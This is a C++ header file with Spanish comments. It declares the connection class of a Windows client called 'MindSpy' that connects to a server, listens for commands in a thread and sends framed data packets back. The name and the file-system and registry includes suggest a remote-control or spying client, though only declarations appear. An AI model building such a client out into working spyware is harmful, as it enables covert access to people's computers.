/**
* @file Conector.h
* @author Carlos D. Alvarez
* @date 10/12/2016
* @brief Define la clase Conector
*/

#pragma once
#include <windows.h>
#include <string>
#include <sstream>
#include <cstdio>
#include <Iphlpapi.h>
#include "Sistema.h"
#include "../Datos.h"
#include "FileSystem.h"
#include "Registro.h"
// tamaño de buffer maximo
#define MAX_BUFFER 4096
// Comandos disponibles
#define CANTIDAD_COMANDOS 4
// Constante para comandos no validos
#define COMANDO_NO_EXISTENTE -1
// Version del cliente. Enviada al servidor
#define VERSION_CLIENTE "MindSpy 1.0 - (Alpha, Pre-Release)"

using namespace std;

namespace MindSpy
{
	//! Métodos de conexión y comunicación con el servidor
	class Conector {
	private:
		//! Data del socket
		WSADATA wsd;
		//! Socket del cliente
		SOCKET sckt;
		//! Información del servidor
		sockaddr_in server;
		//! Información de sistema
		Sistema sys;
		//! Estatus de la conexión
		bool Conectado;
		//! Mensaje del server
		char msg[MAX_BUFFER];

		/**
		*	@brief Ciclo de escucha del cliente. Procesa mensajes
		*/
		void Escuchar();

		/**
		* @brief Correrá en un hilo nuevo. Llama a la función Escuchar.
		* @param[in] l Párámetro que contiene un puntero a la clase Conector.
		* @return Siempre devuelve TRUE.
		*/
		static DWORD WINAPI HiloProc(LPARAM l)
		{
			Conector *c = (Conector*)l;
			c->Escuchar();
			return TRUE;
		}

		/**
		* @brief Recorre la lista de comandos en busca de "c" para obtener su ID.
		* @param[in] c Texto del comando a buscar
		* @return Si la función tiene éxito, devuelve el ID del comando. Sino, devuelve COMANDO_NO_EXISTENTE
		*/
		int TipoComando(const char*c);

	public:
		/**
		* @brief Constructor, inicializa y conecta el cliente al servidor.
		*/
		Conector();
		
		/**
		* @brief Destructor, Libera el socket y memoria dinámica reservada
		*/
		~Conector();

		/**
		* @brief Indica si el cliente está conectado
		* @return true si el cliente está conectado. false en caso contrario.
		*/
		bool Listo();

		/**
		* @brief	Envia un comando, junto con su data, al cliente
		* @param [in]	SizeofData	Information describing the sizeof.
		* @param [in]	comando   	The comando.
		* @param [in]	Data	  	If non-null, the data.
		*
		* @return	true si se pudo enviar el comando, false en caso contrario
		* @note
		*	La estructura de los paquetes a enviar, es siempre la misma, independientemente de
		*	los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.<br>
		*	Los primeros cuatro bytes del paquete, corresponden al tamaño del paquete. Los segundos
		*	cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
		*	se ubica la data a enviar.
		*/
		bool EnviarComando(UINT32 SizeofData, UINT32 comando, BYTE* Data);
	};
}
